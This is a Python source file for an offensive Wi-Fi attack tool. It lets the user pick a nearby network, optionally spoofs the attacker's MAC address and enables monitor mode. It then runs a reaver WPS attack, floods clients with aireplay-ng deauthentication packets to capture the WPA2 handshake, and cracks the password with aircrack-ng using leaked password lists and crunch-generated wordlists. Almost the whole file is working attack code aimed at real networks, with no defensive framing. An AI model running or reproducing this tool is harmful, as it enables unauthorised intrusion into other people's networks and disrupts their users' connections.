from xml.dom import ValidationErr
import pyrcrack
import os, sys
import subprocess
import re
from wifi import Cell, Scheme
from time import sleep 
import pandas as pd
import wordlist 
import fcntl
import socket
import struct

#necessary software : aircrack-ng, crunch, reaver

dirname = os.path.dirname(__file__)
filename = os.path.join(dirname, '../0_preconnection/')
sys.path.append(filename)
from mac import MacHandling

class Wifi:
    def __init__(self, safe:bool = False, interface:str="wlp4s0"):
        """
        Safe : if true, prudent approach and mac spoofing
        TODO deaiuth only one client if available in the captured csv file
        TODO : append all generated wordlists
        Arguments : 
            safe:bool : if true, change mac address
            interface:str : Name of the wifi interface to use for attack, should support monitor mode
        """
        self.client_mac = "ff:ff:ff:ff:ff:ff"
        self.mac_changer = MacHandling(interface, True, True)
        self.safe = safe
        self.airmon = pyrcrack.AirmonNg()
        self.airodump = pyrcrack.AirodumpNg()
        self.interface = interface
        self.wordlist_folder = "wordlists/"

    def run(self, filename = "files/test", generate_wordlist:bool = False, intensity:int = 1, wps:bool = False):
        """
        Runs the attack
        Arguments : 
            filename:str : location of the capture files from airodump
            generate_wordlist : if true, will use crunch to generate a wordlist. Lengthy and can take some disk space
            intensity:int : number between 0 and 3 inclusive. Higher number will use more wordlists and will make deauth more aggressive
        """
        self.scan_networks()
        self.prepare()
        if self.network.encryption_type=="wpa2":
            if wps:
                try : 
                    self.attack_wps(filename, intensity)
                except Exception as e:
                    print(e)
                    print("[] WPS attack failed, attack on WPA2 - Might not be possible")
            self.attack_wpa2(filename, generate_wordlist, intensity)

    def prepare(self):
        """
        Change mac address is safe
        Enable monitor mode and check if correctly activated
        TODO : keep 3 first bytes
        """
        #Change mac address
        if self.safe :
            self.mac = self.mac_changer.main()
            print("[] MAC address changed !")


        #enable monitor mode
        subprocess.call(["ifconfig", self.interface, "down"])
        try : 
            subprocess.check_output(["airmon-ng", "check", "kill"])
            subprocess.check_output(["airmon-ng", "monitor"])
            #subprocess.check_output(["airmon-ng", "start", self.interface])
        except Exception as e:
            print("Airmon-ng does not seem to work, monitor mode will be activated via iwxonfig")
            print(e)
        subprocess.check_output(["iwconfig", self.interface, "mode", "monitor"])
        
        
        subprocess.call(["ifconfig", self.interface, "up"])
        output = subprocess.check_output(["iwconfig", self.interface])
        mode = re.search(r"Mode:\D*\s",str(output))
        mode = re.findall(r"(Mode:Managed|Mode:Monitor)",str(output))
        
        if 'Mode:Monitor' in mode : 
            print("[] Monitor mode activated !")


    def scan_networks(self):
        """
        Scan for available networks
        """
        print("Available networks :")
        networks_list = list(Cell.all(self.interface))
        for index, network in enumerate(networks_list):
            print("{} : {}, signal {}, auth : {}".format(index, network.ssid, network.signal, network.encryption_type))
        
        net_index = input("Choose network to connect to : ")
        try : 
            net_index = int(net_index)
        except : 
            raise ValueError('Choose the network number')
        self.network = networks_list[net_index] #str "wpa" "wep" or "wpa2"
        print("Attack on {}, encryption is {}".format(self.network.ssid, self.network.encryption_type))

    def attack_wps(self, filename:str, intensity:int):
        """
        
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', bytes(self.interface, 'utf-8')[:15]))
        mac =  ':'.join('%02x' % b for b in info[18:24])
        replay = subprocess.Popen(["aireplay-ng", "–-fakeauth", "15", "-a", self.network.address, "-h", mac, self.interface])
        subprocess.call(["reaver", "-i", self.interface, "-c", "6", "-b", self.network.address, "-vvv", "--no-associate"])
        replay.kill()

    def attack_wpa2(self, filename = "files/test", generate_wordlist:bool = False, intensity:int = 1):
        """
        Aircrack-ng attack on wpa2 networks
        """
        
        #More elegant, but I want an open console to keep an eye on catured frames
        capture = subprocess.Popen(["konsole", "-e", 'airodump-ng',"-c", str(self.network.channel), '-w', filename, "--bssid", self.network.address, self.interface],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #Stop execution, can't be used
        #command = "airodump-ng wlp5s0f3u3"
        #os.system("konsole -e 'bash -c \""+command+";bash\"'")

        print("[] Capture started")

        intensity_deauth = [10,20,30,100]
        deauth = subprocess.Popen(['aireplay-ng', '-0', str(intensity_deauth[intensity]), "-a", self.network.address, self.interface],
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[] Deauthentication started on all clients")

        wordlists = self.wordlist_getter(generate_wordlist, intensity)
        print("[] Wordlist acquired")

        print("[] Wait for capture")
        #Wait to get a client address
        intensity_sleeping_time = [5,75,150,250]
        sleeping_time = intensity_sleeping_time[intensity]

        found_station = False
        for i in range (0,10):

            total_time = round(sleeping_time*10/60)
            elapsed_m = sleeping_time*i // 60
            elapsed_s = sleeping_time*i % 60
            print("-->{} minutes {} second on {} minutes : capture in progress ...".format(elapsed_m, elapsed_s, total_time))
            sleep(sleeping_time)
            #Look for stations connected
            station_mac = False
            data = pd.read_csv(filename + "-01.csv")
            if not station_mac:
                print(data)
                try : 
                    index_first_station_row = data[data.BSSID=="Station MAC"].index.values + 1
                    station_mac = data.iloc[index_first_station_row].BSSID.values[1]
                    print("Found a connected station : {}!".format(station_mac))
                    call = subprocess.call(['aireplay-ng', '-0', "250", "-a", self.network.address, "-c", station_mac, self.interface])
                    
                except IndexError: 
                    call = subprocess.call(['aireplay-ng', '-0', "50", "-a", self.network.address, self.interface])
            else : 
                #If no connected stations found
                call = subprocess.call(['aireplay-ng', '-0', "250", "-a", self.network.address, "-c", station_mac, self.interface])
            
            #

        print("[] Starting bruteforcing password")
        for wordlist in wordlists:
            print("--> Trying wordlist {}".format(wordlist))
            subprocess.call(["aircrack-ng", "-w", self.wordlist_folder+wordlist, filename+"-01.cap"])

        

        print(capture)
        capture.kill()
        deauth.kill()

    def wordlist_generator_py(self, intensity):
        """
        Replaced by crunch subprocess
        """
        if intensity == 0:
            charset = "[a-zA-Z0-9]"
            max_length = 5
        elif intensity == 1:
            charset = "[a-zA-Z0-9]"
            max_length = 11
        elif intensity == 2:
            charset = "[a-zA-Z0-9]"
            max_length = 15
        elif intensity > 2:
            charset = "[a-zA-Z0-9]\*\.\+"
            max_length = 20

        generator = wordlist.Generator(charset)
        random_wordlist = []
        for each in generator.generate(3, max_length):
            random_wordlist.append(each)
        print(random_wordlist)  

    def wordlist_getter(self, generate_wordlist, intensity):
        """
        Generate wordlist, and select existing wordlists depending on generation an intensity parameters
        """
        if generate_wordlist:
            self.wordlist_generator(intensity=intensity)

        subset ={0:["richelieu-french-top5000.txt"],\
            1:["richelieu-french-top20000.txt", "dutch_passwordlist.txt", "darkweb2017-top1000.txt", "Keyboard-Combinations.txt"],\
            2:["richelieu-french-top20000.txt", "dutch_passwordlist.txt", "darkweb2017-top1000.txt", "darkc0de.txt", "Keyboard-Combinations.txt"],\
            3:["richelieu-french-top20000.txt", "dutch_passwordlist.txt", "darkweb2017-top1000.txt", "darkc0de.txt", "Keyboard-Combinations.txt"]}
        filenames = subset[intensity]
        filenames.append("generated_{}.txt".format(intensity))
        return filenames

    
    def wordlist_generator(self, intensity:int):
        """
        Crunch wordlist generation
        """
        print("[] Generating wordlist")
        max_len_dict = [6,6,6,7]
        min_len_dict = [5,5,5,5]
        try : 
            max_len = max_len_dict[intensity]
            min_len = min_len_dict[intensity]
        except Exception as e:
            print(e)
            max_len = 5

        subprocess.call(["crunch", str(min_len), str(max_len), "-o", self.wordlist_folder + "generated_{}.txt".format(intensity)])



        


    def restore_normalcy(self):
        """
        Check back to Mac Adress
        Mode should be managed at the end
        """
        #enable monitor mode
        subprocess.call(["ifconfig", self.interface, "down"])
        """
        try : 
            subprocess.check_output(["airmon-ng", "check", "kill"])
            subprocess.check_output(["airmon-ng", "monitor"])
            #subprocess.check_output(["airmon-ng", "start", self.interface])
        except Exception as e:
            print("Airmon-ng does not seem to work, monitor mode will be activated via iwxonfig")
            print(e)
        """
        subprocess.check_output(["iwconfig", self.interface, "mode", "managed"])
        
        
        subprocess.call(["ifconfig", self.interface, "up"])
        output = subprocess.check_output(["iwconfig", self.interface])
        mode = re.search(r"Mode:\D*\s",str(output))
        mode = re.findall(r"(Mode:Managed|Mode:Monitor)",str(output))
        
        if 'Mode:Managed' in mode : 
            print("[] Monitor mode sucessfully deactivated !")


if __name__=="__main__":
    alfa = "wlp5s0f3u2"
    alfa = "wlp5s0f3u3"
    main_card = "wlp4s0"
    wifi_getter = Wifi(safe=False, interface=alfa)
    wifi_getter.run(generate_wordlist = False, intensity=1)
    #wifi_getter.wordlist_getter(True, 0)